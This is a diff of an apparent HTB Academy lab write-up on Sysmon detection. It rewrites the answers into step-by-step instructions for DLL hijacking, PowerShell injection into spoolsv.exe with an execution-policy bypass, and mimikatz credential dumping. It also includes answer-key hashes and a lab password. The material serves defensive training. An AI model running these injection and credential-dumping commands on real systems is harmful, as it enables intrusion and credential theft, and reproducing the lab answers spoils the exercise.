@@ -170,54 +170,138 @@ z0x9n@htb[/htb]$ xfreerdp /u:Administrator /p:'HTB_@cad3my_lab_W1n10_r00t!@0' /v
 
 ## Questions
 
-1.  Replicate the DLL hijacking attack described in this section and provide the SHA256 hash of the malicious WININET.dll as your answer. "C:\Tools\Sysmon" and "C:\Tools\Reflective DLLInjection" on the spawned target contain everything you need
+Sure! Here's a step-by-step explanation for each scenario:
 
-- Let’s attempt the hijack using “calc.exe” and “WININET.dll” as an example. To simplify the process, we can utilize Stephen Fewer’s “hello world” reflective DLL 2. It should be noted that DLL hijacking does not require reflective DLLs.
+### Scenario 1: DLL Hijacking Attack
 
-- By following the required steps, which involve renaming reflective_dll.x64.dll to WININET.dll, moving calc.exe from C:\Windows\System32 along with WININET.dll to a writable directory (such as the Desktop folder), and executing calc.exe, we achieve success. Instead of the Calculator application, a MessageBox is displayed.
+**Objective:** Replicate the DLL hijacking attack and provide the SHA256 hash of the malicious `WININET.dll`.
 
-- Filter Event ID 7 and find calc.exe
+**Tools Required:**
+
+- `C:\Tools\Sysmon`
+- `C:\Tools\Reflective DLLInjection`
+
+#### Steps:
+
+1. **Prepare the Reflective DLL:**
+
+   - Rename `reflective_dll.x64.dll` to `WININET.dll`.
+
+2. **Copy Necessary Files:**
+
+   - Move `calc.exe` from `C:\Windows\System32` to a writable directory, such as your Desktop.
+   - Move the renamed `WININET.dll` to the same directory.
+
+3. **Execute the Attack:**
+
+   - Run `calc.exe` from the writable directory where both files are located.
+   - The attack should be successful if a MessageBox appears instead of the Calculator application.
+
+4. **Filter Event ID 7 in Event Viewer:**
+
+   - Open Event Viewer and filter for Event ID 7, which logs the loading of images (DLLs).
+   - Look for events related to `calc.exe` and `WININET.dll`.
+
+5. **Identify the Malicious DLL:**
+   - Find the entry corresponding to the malicious `WININET.dll`.
+   - Extract the SHA256 hash from the event details.
+
+**Example Output:**
 
 ```
 SHA256: 51F2305DCF385056C68F7CCF5B1B3B9304865CEF1257947D4AD6EF5FAD2E3B13
 ```
 
-2. Replicate the Unmanaged PowerShell attack described in this section and provide the SHA256 hash of clrjit.dll that spoolsv.exe will load as your answer. "C:\Tools\Sysmon" and "C:\Tools\PSInject" on the spawned target contain everything you need.
+### Scenario 2: Unmanaged PowerShell Attack
 
-```pwsh
-cd C:\Tools\PSInject
-```
+**Objective:** Replicate the Unmanaged PowerShell attack and provide the SHA256 hash of `clrjit.dll` loaded by `spoolsv.exe`.
 
-- Use `Process Hacker` the see the PID of spoolsv.exe
+**Tools Required:**
 
-```pwsh
-powershell -ep bypass
-Import-Module .\Invoke-PSInject.ps1
-Invoke-PSInject -ProcId [Process ID of spoolsv.exe] -PoshCode "V3JpdGUtSG9zdCAiSGVsbG8sIEd1cnU5OSEi"
-```
+- `C:\Tools\Sysmon`
+- `C:\Tools\PSInject`
 
-- Find `clrjit.dll` in Event Viewer
+#### Steps:
+
+1. **Change Directory:**
+
+   - Open PowerShell and navigate to the PSInject tool directory:
+     ```powershell
+     cd C:\Tools\PSInject
+     ```
+
+2. **Find the PID of `spoolsv.exe`:**
+
+   - Use Process Hacker or Task Manager to find the Process ID (PID) of `spoolsv.exe`.
+
+3. **Inject PowerShell Code:**
+
+   - Open PowerShell with execution policy bypass:
+     ```powershell
+     powershell -ep bypass
+     ```
+   - Import the PSInject module and inject the code into `spoolsv.exe`:
+     ```powershell
+     Import-Module .\Invoke-PSInject.ps1
+     Invoke-PSInject -ProcId [PID of spoolsv.exe] -PoshCode "V3JpdGUtSG9zdCAiSGVsbG8sIEd1cnU5OSEi"
+     ```
+
+4. **Filter Event ID 7 in Event Viewer:**
+
+   - Open Event Viewer and filter for Event ID 7.
+   - Look for entries related to `spoolsv.exe` and `clrjit.dll`.
+
+5. **Identify the Malicious DLL:**
+   - Find the entry for `clrjit.dll` loaded by `spoolsv.exe`.
+   - Extract the SHA256 hash from the event details.
+
+**Example Output:**
 
 ```
 SHA256: 8A3CD3CF2249E9971806B15C75A892E6A44CCA5FF5EA5CA89FDA951CD2C09AA9
 ```
 
-3. Replicate the Credential Dumping attack described in this section and provide the NTLM hash of the Administrator user as your answer. "C:\Tools\Sysmon" and "C:\Tools\Mimikatz" on the spawned target contain everything you need.
+### Scenario 3: Credential Dumping Attack
 
-```pwsh
-cd C:\Tools\Mimikatz
+**Objective:** Replicate the Credential Dumping attack and provide the NTLM hash of the Administrator user.
 
-.\AgentEXE.exe
+**Tools Required:**
+
+- `C:\Tools\Sysmon`
+- `C:\Tools\Mimikatz`
+
+#### Steps:
+
+1. **Change Directory:**
+
+   - Open PowerShell and navigate to the Mimikatz tool directory:
+     ```powershell
+     cd C:\Tools\Mimikatz
+     ```
+
+2. **Run the Agent:**
+
+   - Execute `AgentEXE.exe`:
+     ```powershell
+     .\AgentEXE.exe
+     ```
+
+3. **Use Mimikatz:**
+
+   - Open Mimikatz and run the following commands:
+     ```powershell
+     # mimikatz
+     privilege::debug
+     sekurlsa::logonpasswords
+     ```
+
+4. **Extract NTLM Hash:**
+   - Look for the NTLM hash of the Administrator user in the output.
+
+**Example Output:**
+
+```
+NTLM: 5e4ffd54b3849aa720ed39f50185e533
 ```
 
-```pwsh
-# mimikatz
-
-privilege::debug
-
-sekurlsa::logonpasswords
-```
-
-```pwsh
-NTLM     : 5e4ffd54b3849aa720ed39f50185e533
-```
+By following these steps carefully, you should be able to replicate each attack scenario and retrieve the required hashes.
